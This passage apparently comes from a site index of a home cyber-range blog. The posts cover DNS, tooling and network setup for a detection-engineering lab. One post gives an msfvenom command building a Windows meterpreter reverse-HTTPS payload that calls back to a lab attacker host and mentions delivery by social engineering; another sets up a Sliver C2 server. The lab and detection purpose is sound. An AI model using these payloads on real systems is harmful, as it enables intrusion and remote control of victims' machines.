style=\"color:#e6db74\"\u003e\u0026#34;192.168.40.5\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"results\"\u003eResults\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eOPF-DC01\u003c/code\u003e now properly resides at \u003ccode\u003e192.168.40.100\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eRouting flows through \u003ccode\u003eopf-fw01\u003c/code\u003e via gateway \u003ccode\u003e192.168.40.5\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eIt is ready to serve domain joins from endpoints like \u003ccode\u003eOPF-MBR01\u003c/code\u003e.\u003c/li\u003e\n\u003c/ul\u003e","title":"Correcting OPF-DC01 Placement in ADINFRA Segment"},{"content":"🧩 Problem Summary After placing OPF-DC01 into the ADINFRA subnet (192.168.40.0/24), OPF-MBR01 was unable to resolve public domains such as google.com. DNS requests to 192.168.40.100 (the DC) failed to resolve, even though routing to the firewall was functional.\n🔍 Root Cause By default, OPF-DC01 was not forwarding DNS queries to a working upstream resolver. Attempted use of public DNS forwarders like 8.8.8.8 and 1.1.1.1 failed because OPF-DC01 had no internet access in the segmented lab setup.\n✅ Solution Summary We aligned the DNS architecture with best practice by:\nKeeping OPF-DC01 isolated to ADINFRA (no internet). Forwarding external DNS requests to pfSense at 192.168.40.5. 🔧 Step-by-Step Fix 1. Update DNS Forwarders on OPF-DC01 Open DNS Manager Right-click the server → Properties Go to Forwarders tab Remove any entries for 8.8.8.8 or 1.1.1.1 Add: 192.168.40.5 Then open PowerShell and run:\ndnscmd /clearcache 2. Ensure DNS Resolver is Active on pfSense Navigate to Services \u0026gt; DNS Resolver Ensure it is enabled and listens on all interfaces Optional:\nAdd 8.8.8.8 and 1.1.1.1 under System \u0026gt; General Setup \u0026gt; DNS Servers (for pfSense to reach the internet). 3. Verify from Domain Clients From OPF-MBR01:\nnslookup google.com 192.168.40.100 Test-NetConnection google.com -Port 443 Expected output:\nDNS resolved to public IP HTTPS port is reachable 📌 Result Domain-joined workstations now use the domain controller for internal resolution, and the domain controller relies on the pfSense firewall for external resolution, mirroring realistic enterprise segmentation.\n","permalink":"https://opforge.dev/posts/2025-05-27-opf-dns-forwarding-infrastructure-fix/","summary":"\u003ch2 id=\"-problem-summary\"\u003e🧩 Problem Summary\u003c/h2\u003e\n\u003cp\u003eAfter placing \u003ccode\u003eOPF-DC01\u003c/code\u003e into the \u003ccode\u003eADINFRA\u003c/code\u003e subnet (192.168.40.0/24), \u003ccode\u003eOPF-MBR01\u003c/code\u003e was unable to resolve public domains such as \u003ccode\u003egoogle.com\u003c/code\u003e. DNS requests to \u003ccode\u003e192.168.40.100\u003c/code\u003e (the DC) failed to resolve, even though routing to the firewall was functional.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"-root-cause\"\u003e🔍 Root Cause\u003c/h2\u003e\n\u003cp\u003eBy default, \u003ccode\u003eOPF-DC01\u003c/code\u003e was not forwarding DNS queries to a working upstream resolver. Attempted use of public DNS forwarders like \u003ccode\u003e8.8.8.8\u003c/code\u003e and \u003ccode\u003e1.1.1.1\u003c/code\u003e failed because \u003ccode\u003eOPF-DC01\u003c/code\u003e had \u003cstrong\u003eno internet access\u003c/strong\u003e in the segmented lab setup.\u003c/p\u003e","title":"Fixing DNS Resolution in OPFORGE: Domain Forwarding via pfSense"},{"content":"🎯 Purpose In the OPFORGE lab, Chocolatey may not be reliable due to segmented DNS or network control. Here\u0026rsquo;s how to install the full Sysinternals Suite offline to a standard lab path.\n🗂️ Installation Directory All tools are installed to:\nC:\\OPFORGE\\Tools\\Sysinternals This ensures consistent, reproducible builds and clean environment variables.\n🛠️ Installation Steps 1. Download From a system with internet access:\nInvoke-WebRequest -Uri \u0026#34;https://download.sysinternals.com/files/SysinternalsSuite.zip\u0026#34; -OutFile \u0026#34;SysinternalsSuite.zip\u0026#34; 2. Transfer and Install Copy the zip to C:\\OPFORGE\\SysinternalsSuite.zip, then run:\n$toolsPath = \u0026#34;C:\\OPFORGE\\Tools\\Sysinternals\u0026#34; New-Item -Path $toolsPath -ItemType Directory -Force Move-Item -Path \u0026#34;C:\\OPFORGE\\SysinternalsSuite.zip\u0026#34; -Destination \u0026#34;$toolsPath\\SysinternalsSuite.zip\u0026#34; Expand-Archive -Path \u0026#34;$toolsPath\\SysinternalsSuite.zip\u0026#34; -DestinationPath $toolsPath -Force 3. Update System Path [Environment]::SetEnvironmentVariable(\u0026#34;Path\u0026#34;, $env:Path + \u0026#34;;$toolsPath\u0026#34;, [EnvironmentVariableTarget]::Machine) ✅ Result You can now run Sysinternals tools (like tcpview, autoruns, procmon) from any command line on the system. This method avoids Chocolatey errors and supports air-gapped deployment.\n","permalink":"https://opforge.dev/posts/2025-05-27-opf-sysinternals-offline-install/","summary":"\u003ch2 id=\"-purpose\"\u003e🎯 Purpose\u003c/h2\u003e\n\u003cp\u003eIn the OPFORGE lab, Chocolatey may not be reliable due to segmented DNS or network control. Here\u0026rsquo;s how to install the full \u003ca href=\"https://learn.microsoft.com/en-us/sysinternals/\"\u003eSysinternals Suite\u003c/a\u003e offline to a standard lab path.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"-installation-directory\"\u003e🗂️ Installation Directory\u003c/h2\u003e\n\u003cp\u003eAll tools are installed to:\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eC:\\OPFORGE\\Tools\\Sysinternals\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eThis ensures consistent, reproducible builds and clean environment variables.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"-installation-steps\"\u003e🛠️ Installation Steps\u003c/h2\u003e\n\u003ch3 id=\"1-download\"\u003e1. Download\u003c/h3\u003e\n\u003cp\u003eFrom a system with internet access:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eInvoke-WebRequest -Uri \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;https://download.sysinternals.com/files/SysinternalsSuite.zip\u0026#34;\u003c/span\u003e -OutFile \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;SysinternalsSuite.zip\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"2-transfer-and-install\"\u003e2. Transfer and Install\u003c/h3\u003e\n\u003cp\u003eCopy the zip to \u003ccode\u003eC:\\OPFORGE\\SysinternalsSuite.zip\u003c/code\u003e, then run:\u003c/p\u003e","title":"Installing Sysinternals Suite Offline in OPFORGE"},{"content":"Metasploit Installed Metasploit was installed using the official msfinstall script:\ncurl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb -o msfinstall chmod 755 msfinstall sudo ./msfinstall Confirmed with:\nmsfconsole --version Payload Generation The following payload was created for C2 operations within the DMZRED segment:\nsudo msfvenom -p windows/x64/meterpreter/reverse_https \\ LHOST=192.168.22.50 LPORT=8443 \\ -f exe -o shell.exe Payload was moved to:\n/opt/opforge/redteam/payloads/shell.exe File properties:\nfile shell.exe sha256sum shell.exe The payload is now ready to be staged from OPF-RED01 or delivered via social engineering as part of a detection validation scenario.\nNext Steps Set up listener in msfconsole Deploy payload to opf-mbr01 Monitor detection in opf-blue01, opf-ai01, or via Winlogbeat pipeline ","permalink":"https://opforge.dev/posts/2025-05-26-opf-red01-metasploit-setup/","summary":"\u003ch2 id=\"metasploit-installed\"\u003eMetasploit Installed\u003c/h2\u003e\n\u003cp\u003eMetasploit was installed using the official \u003ccode\u003emsfinstall\u003c/code\u003e script:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecurl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb -o msfinstall\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003echmod \u003cspan style=\"color:#ae81ff\"\u003e755\u003c/span\u003e msfinstall\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo ./msfinstall\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eConfirmed with:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emsfconsole --version\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"payload-generation\"\u003ePayload Generation\u003c/h2\u003e\n\u003cp\u003eThe following payload was created for C2 operations within the DMZRED segment:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo msfvenom -p windows/x64/meterpreter/reverse_https \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e  LHOST\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e192.168.22.50 LPORT\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e8443\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e  -f exe -o shell.exe\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003ePayload was moved to:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e/opt/opforge/redteam/payloads/shell.exe\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eFile properties:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003efile shell.exe\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esha256sum shell.exe\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eThe payload is now ready to be staged from OPF-RED01 or delivered via social engineering as part of a detection validation scenario.\u003c/p\u003e","title":"OPF-RED01 Metasploit Setup \u0026 Payload Generation"},{"content":"Sliver Build \u0026amp; Launch After cloning the Sliver repository and resolving build prerequisites (notably zip), the server was compiled successfully using:\ncd /opt/opforge/tools/sliver make The Sliver server was then launched:\n./sliver-server Screenshot of Successful Launch This confirms the Sliver C2 is operational and ready to receive implants or generate payloads.\nNext Steps Launch sliver-client and test C2 communication Generate staged and unstaged payloads Begin Red Team activity with Sliver in DMZRED Monitor OPF-BLUE01/AI01 for correlated events ","permalink":"https://opforge.dev/posts/2025-05-26-opf-red01-sliver-setup/","summary":"\u003ch2 id=\"sliver-build--launch\"\u003eSliver Build \u0026amp; Launch\u003c/h2\u003e\n\u003cp\u003eAfter cloning the Sliver repository and resolving build prerequisites (notably \u003ccode\u003ezip\u003c/code\u003e), the server was compiled successfully using:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecd /opt/opforge/tools/sliver\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emake\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eThe Sliver server was then launched:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e./sliver-server\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"screenshot-of-successful-launch\"\u003eScreenshot of Successful Launch\u003c/h2\u003e\n\u003cp\u003e\u003cimg alt=\"Sliver Server Launch\" loading=\"lazy\" src=\"/images/posts/sliver-server-launch.png\"\u003e\u003c/p\u003e\n\u003cp\u003eThis confirms the Sliver C2 is operational and ready to receive implants or generate payloads.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"next-steps\"\u003eNext Steps\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eLaunch \u003ccode\u003esliver-client\u003c/code\u003e and test C2 communication\u003c/li\u003e\n\u003cli\u003eGenerate staged and unstaged payloads\u003c/li\u003e\n\u003cli\u003eBegin Red Team activity with Sliver in DMZRED\u003c/li\u003e\n\u003cli\u003eMonitor OPF-BLUE01/AI01 for correlated events\u003c/li\u003e\n\u003c/ul\u003e","title":"OPF-RED01 Sliver Server Setup"},{"content":"base-ubuntu-2204-template OS: Ubuntu 22.04 LTS Minimal Uses: Cloning source for opf-red01, opf-log01, opf-ai01, opf-cloud01 Hardened baseline with: UFW firewall SSH key-based auth Git, Python, pip pre-installed Snapshot name: Clean Install – Ready for Clone base-windows10-template OS: Windows 10 Pro 22H2 (fully patched) Uses: Cloning source for opf-mbr01, future victims Tools installed via Chocolatey: Sysmon, Winlogbeat, VSCode, Wireshark, Sysinternals Pre-Sysprep and snapshot-ready ","permalink":"https://opforge.dev/posts/2024-05-25-opforge-template-builds/","summary":"\u003ch2 id=\"base-ubuntu-2204-template\"\u003ebase-ubuntu-2204-template\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eOS: Ubuntu 22.04 LTS Minimal\u003c/li\u003e\n\u003cli\u003eUses: Cloning source for \u003ccode\u003eopf-red01\u003c/code\u003e, \u003ccode\u003eopf-log01\u003c/code\u003e, \u003ccode\u003eopf-ai01\u003c/code\u003e, \u003ccode\u003eopf-cloud01\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eHardened baseline with:\n\u003cul\u003e\n\u003cli\u003eUFW firewall\u003c/li\u003e\n\u003cli\u003eSSH key-based auth\u003c/li\u003e\n\u003cli\u003eGit, Python, pip pre-installed\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eSnapshot name: \u003ccode\u003eClean Install – Ready for Clone\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"base-windows10-template\"\u003ebase-windows10-template\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eOS: Windows 10 Pro 22H2 (fully patched)\u003c/li\u003e\n\u003cli\u003eUses: Cloning source for \u003ccode\u003eopf-mbr01\u003c/code\u003e, future victims\u003c/li\u003e\n\u003cli\u003eTools installed via Chocolatey:\n\u003cul\u003e\n\u003cli\u003eSysmon, Winlogbeat, VSCode, Wireshark, Sysinternals\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003ePre-Sysprep and snapshot-ready\u003c/li\u003e\n\u003c/ul\u003e","title":"Building Hardened Base Templates for Red, Blue, and AI VMs in OPFORGE"},{"content":"Segments CSOCINFRA (192.168.20.0/24): Houses opf-log01 (SIEM) and opf-ai01 (ML detection) LANWORKSTATIONS (192.168.30.0/24): Contains opf-mbr01 and future endpoints DMZRED (192.168.22.0/24): Hosts attacker targets like opf-cloud01 ADINFRA (192.168.40.0/24): Supports opf-dc01 and GPO testing Example Host Assignments Host IP Address Segment opf-fw01 192.168.1.24 (WAN) pfSense router opf-dc01 192.168.40.100 ADINFRA opf-mbr01 192.168.30.101 LANWORKSTATIONS opf-red01 192.168.22.50 DMZRED opf-log01 192.168.20.12 CSOCINFRA ","permalink":"https://opforge.dev/posts/2024-05-25-opforge-network-design/","summary":"\u003ch2 id=\"segments\"\u003eSegments\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCSOCINFRA (192.168.20.0/24)\u003c/strong\u003e: Houses \u003ccode\u003eopf-log01\u003c/code\u003e (SIEM) and \u003ccode\u003eopf-ai01\u003c/code\u003e (ML detection)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eLANWORKSTATIONS (192.168.30.0/24)\u003c/strong\u003e: Contains \u003ccode\u003eopf-mbr01\u003c/code\u003e and future endpoints\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDMZRED (192.168.22.0/24)\u003c/strong\u003e: Hosts attacker targets like \u003ccode\u003eopf-cloud01\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eADINFRA (192.168.40.0/24)\u003c/strong\u003e: Supports \u003ccode\u003eopf-dc01\u003c/code\u003e and GPO testing\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"example-host-assignments\"\u003eExample Host Assignments\u003c/h2\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003eHost\u003c/th\u003e\n          \u003cth\u003eIP Address\u003c/th\u003e\n          \u003cth\u003eSegment\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eopf-fw01\u003c/td\u003e\n          \u003ctd\u003e192.168.1.24 (WAN)\u003c/td\u003e\n          \u003ctd\u003epfSense router\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eopf-dc01\u003c/td\u003e\n          \u003ctd\u003e192.168.40.100\u003c/td\u003e\n          \u003ctd\u003eADINFRA\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eopf-mbr01\u003c/td\u003e\n          \u003ctd\u003e192.168.30.101\u003c/td\u003e\n          \u003ctd\u003eLANWORKSTATIONS\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eopf-red01\u003c/td\u003e\n          \u003ctd\u003e192.168.22.50\u003c/td\u003e\n          \u003ctd\u003eDMZRED\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eopf-log01\u003c/td\u003e\n          \u003ctd\u003e192.168.20.12\u003c/td\u003e\n          \u003ctd\u003eCSOCINFRA\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e","title":"Designing a Segmented Cyber Lab: OPFORGE Network Architecture"},{"content":"OPFORGE began as a minimal cyber range with SOF-ELK and basic telemetry ingest, and has evolved into a segmented, multi-role portfolio lab for red team emulation, detection engineering, and AI-enhanced threat analysis.\nEvolution Timeline Phase 1: Initial Sandbox Single VM (SOF-ELK) Flat network, no segmentation Manual log ingestion Phase 2: Tactical Expansion Added pfSense (opf-fw01) Introduced segmentation: CSOCINFRA, DMZRED, LANWORKSTATIONS, ADINFRA First red team emulation with opf-red01 Winlogbeat and Sysmon on endpoints Phase 3: Professionalization Cloned base templates (base-ubuntu-2204-template, base-windows10-template) VM-specific roles: opf-ai01, opf-log01, opf-mbr01, etc. AI and ML integration via Jupyter (opf-ai01) Multi-tiered ingest pipeline (Zeek → Logstash → OpenSearch) Lessons Learned Legacy OS images break modern tools Cloning base templates improves consistency Network segmentation is essential for realistic detection engineering ","permalink":"https://opforge.dev/posts/2024-05-25-opforge-infra-evolution/","summary":"\u003cp\u003eOPFORGE began as a minimal cyber range with SOF-ELK and basic telemetry ingest, and has evolved into a segmented, multi-role portfolio lab for red team emulation, detection engineering, and AI-enhanced threat analysis.\u003c/p\u003e\n\u003ch2 id=\"evolution-timeline\"\u003eEvolution Timeline\u003c/h2\u003e\n\u003ch3 id=\"phase-1-initial-sandbox\"\u003ePhase 1: Initial Sandbox\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eSingle VM (SOF-ELK)\u003c/li\u003e\n\u003cli\u003eFlat network, no segmentation\u003c/li\u003e\n\u003cli\u003eManual log ingestion\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"phase-2-tactical-expansion\"\u003ePhase 2: Tactical Expansion\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eAdded pfSense (\u003ccode\u003eopf-fw01\u003c/code\u003e)\u003c/li\u003e\n\u003cli\u003eIntroduced segmentation: \u003ccode\u003eCSOCINFRA\u003c/code\u003e, \u003ccode\u003eDMZRED\u003c/code\u003e, \u003ccode\u003eLANWORKSTATIONS\u003c/code\u003e, \u003ccode\u003eADINFRA\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eFirst red team emulation with \u003ccode\u003eopf-red01\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eWinlogbeat and Sysmon on endpoints\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"phase-3-professionalization\"\u003ePhase 3: Professionalization\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eCloned base templates (\u003ccode\u003ebase-ubuntu-2204-template\u003c/code\u003e, \u003ccode\u003ebase-windows10-template\u003c/code\u003e)\u003c/li\u003e\n\u003cli\u003eVM-specific roles: \u003ccode\u003eopf-ai01\u003c/code\u003e, \u003ccode\u003eopf-log01\u003c/code\u003e, \u003ccode\u003eopf-mbr01\u003c/code\u003e, etc.\u003c/li\u003e\n\u003cli\u003eAI and ML integration via Jupyter (\u003ccode\u003eopf-ai01\u003c/code\u003e)\u003c/li\u003e\n\u003cli\u003eMulti-tiered ingest pipeline (Zeek → Logstash → OpenSearch)\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"lessons-learned\"\u003eLessons Learned\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eLegacy OS images break modern tools\u003c/li\u003e\n\u003cli\u003eCloning base templates improves consistency\u003c/li\u003e\n\u003cli\u003eNetwork segmentation is essential for realistic detection engineering\u003c/li\u003e\n\u003c/ul\u003e","title":"From Sandbox to Cyber Range: How OPFORGE Evolved into a Professional Portfolio Lab"},{"content":"🧱 Base Templates Used in OPFORGE This post outlines the two core VM templates used to clone all OPFORGE lab components. Each template is hardened, snapshot-ready, and optimized for its role.\n🐧 base-ubuntu-2204-template OS: Ubuntu 22.04 LTS (minimal ISO) Usage: Source image for all Linux-based OPFORGE components Configured With: SSH key-based authentication ufw firewall rules Preinstalled: Git, Python3, pip, htop, curl, net-tools Snapshot Label: ubuntu2204-clean-template 🪟 base-windows10-template OS: Windows 10 Pro 22H2 (fully patched) Usage: Source image for domain-joined endpoints Configured With: Tools installed via Install-OPFORGE-WindowsTools.ps1: Sysmon, Winlogbeat, 7zip, VSCode, Sysinternals, Wireshark Bloatware removal and telemetry disabled Power settings and Start menu cleaned Snapshot Label: win10_22H2_tools_installed Both templates are used to ensure consistency, repeatability, and portfolio-quality documentation across the OPFORGE environment.\n","permalink":"https://opforge.dev/posts/opf-template-notes/","summary":"\u003ch2 id=\"-base-templates-used-in-opforge\"\u003e🧱 Base Templates Used in OPFORGE\u003c/h2\u003e\n\u003cp\u003eThis post outlines the two core VM templates used to clone all OPFORGE lab components. Each template is hardened, snapshot-ready, and optimized for its role.\u003c/p\u003e\n\u003chr\u003e\n\u003ch3 id=\"-base-ubuntu-2204-template\"\u003e🐧 \u003ccode\u003ebase-ubuntu-2204-template\u003c/code\u003e\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eOS\u003c/strong\u003e: Ubuntu 22.04 LTS (minimal ISO)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eUsage\u003c/strong\u003e: Source image for all Linux-based OPFORGE components\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eConfigured With\u003c/strong\u003e:\n\u003cul\u003e\n\u003cli\u003eSSH key-based authentication\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eufw\u003c/code\u003e firewall rules\u003c/li\u003e\n\u003cli\u003ePreinstalled: Git, Python3, pip, htop, curl, net-tools\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eSnapshot Label\u003c/strong\u003e: \u003ccode\u003eubuntu2204-clean-template\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"-base-windows10-template\"\u003e🪟 \u003ccode\u003ebase-windows10-template\u003c/code\u003e\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eOS\u003c/strong\u003e: Windows 10 Pro 22H2 (fully patched)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eUsage\u003c/strong\u003e: Source image for domain-joined endpoints\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eConfigured With\u003c/strong\u003e:\n\u003cul\u003e\n\u003cli\u003eTools installed via \u003ccode\u003eInstall-OPFORGE-WindowsTools.ps1\u003c/code\u003e:\n\u003cul\u003e\n\u003cli\u003eSysmon, Winlogbeat, 7zip, VSCode, Sysinternals, Wireshark\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eBloatware removal and telemetry disabled\u003c/li\u003e\n\u003cli\u003ePower settings and Start menu cleaned\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eSnapshot Label\u003c/strong\u003e: \u003ccode\u003ewin10_22H2_tools_installed\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003cp\u003eBoth templates are used to ensure consistency, repeatability, and portfolio-quality documentation across the OPFORGE environment.\u003c/p\u003e","title":"OPFORGE Base Template Notes"},{"content":"OPFORGE Infrastructure Overview Overview OPFORGE began as a minimal cyber range with SOF-ELK and basic telemetry ingest, and has evolved into a segmented, multi-role portfolio lab for red team emulation, detection engineering, and AI-enhanced threat analysis.\nEvolution Timeline Phase 1: Initial Sandbox Single VM (SOF-ELK) Flat network, no segmentation Manual log ingestion Phase 2: Tactical Expansion Added pfSense (opf-fw01) Introduced segmentation: CSOCINFRA, DMZRED, LANWORKSTATIONS, ADINFRA First red team emulation with opf-red01 Winlogbeat and Sysmon on endpoints Phase 3: Professionalization Cloned base templates (base-ubuntu-2204-template, base-windows10-template) VM-specific roles: opf-ai01, opf-log01, opf-mbr01, etc. AI and ML integration via Jupyter (opf-ai01) Multi-tiered ingest pipeline (Zeek → Logstash → OpenSearch) Lessons Learned Legacy OS images break modern tools Cloning base templates improves consistency Network segmentation is essential for realistic detection engineering ","permalink":"https://opforge.dev/docs/opf-infra/","summary":"\u003ch1 id=\"opforge-infrastructure-overview\"\u003eOPFORGE Infrastructure Overview\u003c/h1\u003e\n\u003ch2 id=\"overview\"\u003eOverview\u003c/h2\u003e\n\u003cp\u003eOPFORGE began as a minimal cyber range with SOF-ELK and basic telemetry ingest, and has evolved into a segmented, multi-role portfolio lab for red team emulation, detection engineering, and AI-enhanced threat analysis.\u003c/p\u003e\n\u003ch2 id=\"evolution-timeline\"\u003eEvolution Timeline\u003c/h2\u003e\n\u003ch3 id=\"phase-1-initial-sandbox\"\u003ePhase 1: Initial Sandbox\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eSingle VM (SOF-ELK)\u003c/li\u003e\n\u003cli\u003eFlat network, no segmentation\u003c/li\u003e\n\u003cli\u003eManual log ingestion\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"phase-2-tactical-expansion\"\u003ePhase 2: Tactical Expansion\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eAdded pfSense (\u003ccode\u003eopf-fw01\u003c/code\u003e)\u003c/li\u003e\n\u003cli\u003eIntroduced segmentation: \u003ccode\u003eCSOCINFRA\u003c/code\u003e, \u003ccode\u003eDMZRED\u003c/code\u003e, \u003ccode\u003eLANWORKSTATIONS\u003c/code\u003e, \u003ccode\u003eADINFRA\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eFirst red team emulation with 